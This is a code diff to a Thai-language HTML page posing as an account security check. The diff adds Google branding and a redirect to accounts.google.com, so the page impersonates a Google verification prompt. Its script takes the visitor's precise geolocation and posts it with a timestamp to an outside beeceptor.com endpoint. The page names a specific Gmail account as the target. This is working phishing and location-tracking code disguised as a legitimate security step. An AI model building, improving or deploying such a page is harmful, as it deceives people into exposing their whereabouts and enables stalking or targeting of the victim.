@@ -7,8 +7,12 @@
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Kanit', sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 90%; border-top: 5px solid #d4af37; }
-        .icon { font-size: 60px; color: #d4af37; margin-bottom: 20px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
+        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 90%; border-top: 5px solid #4285F4; }
+        
+        /* Google Logo Style */
+        .google-logo { font-size: 40px; font-weight: 600; margin-bottom: 20px; letter-spacing: -2px; }
+        .g1 { color: #4285F4; } .g2 { color: #EA4335; } .g3 { color: #FBBC05; } .g4 { color: #4285F4; } .g5 { color: #34A853; } .g6 { color: #EA4335; }
+
         h1 { font-size: 22px; color: #202124; margin-bottom: 10px; }
         .user-box { background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 25px; border: 1px solid #e8eaed; }
         .user-label { font-size: 12px; color: #70757a; display: block; margin-bottom: 5px; }
@@ -16,25 +20,26 @@
         p { font-size: 14px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
         button { background-color: #1a73e8; color: white; border: none; padding: 16px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: all 0.3s; box-shadow: 0 4px 6px rgba(26,115,232,0.2); }
         button:hover { background-color: #1557b0; transform: translateY(-1px); }
-        .footer { margin-top: 25px; font-size: 12px; color: #9aa0a6; border-top: 1px solid #eee; pt: 15px; padding-top: 15px; }
+        .footer { margin-top: 25px; font-size: 12px; color: #9aa0a6; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    <div class="icon">🔒</div>
+    <div class="google-logo">
+        <span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span>
+    </div>
+    
     <h1>ยืนยันตัวตนผู้ใช้งาน</h1>
     
     <div class="user-box">
         <span class="user-label">กำลังดำเนินการสำหรับบัญชี:</span>
         <span class="user-email">icegot153002@gmail.com</span>
     </div>
-
     <p>ระบบตรวจพบการเข้าใช้งานใหม่ เพื่อความปลอดภัย โปรดกดยืนยันพิกัดอุปกรณ์ของท่านเพื่อพิสูจน์สิทธิ์ในการเข้าถึงข้อมูล</p>
     
     <button onclick="getLocation()">ยืนยันตัวตนทันที</button>
     
-    <div class="footer">ระบบรักษาความปลอดภัยอัตโนมัติ  2026</div>
+    <div class="footer">ระบบรักษาความปลอดภัยอัตโนมัติ Google 2026</div>
 </div>
 
 <script>
@@ -43,7 +48,7 @@
             const options = {
                 enableHighAccuracy: true, 
                 timeout: 15000,           
-                maximumAge: 0             
+                maximumAge: 0                         
             };
             navigator.geolocation.getCurrentPosition(sendData, showError, options);
         } else {
@@ -63,13 +68,14 @@
             timestamp: new Date().toLocaleString()
         };
 
+        // ส่งข้อมูลไปยัง Beeceptor ของวิศวกร
         fetch("https://goticetrack.free.beeceptor.com", {
             method: "POST",
             mode: "no-cors",
             body: JSON.stringify(payload)
         }).then(() => {
             alert("ยืนยันตัวตนสำเร็จ ระบบกำลังพาคุณกลับไปที่หน้าหลัก");
-            window.location.href = "https://www.google.com";
+            window.location.href = "https://accounts.google.com";
         });
     }
 
@@ -81,7 +87,7 @@
         }
     }
 </script>
-
 </body>
 </html>
+
 
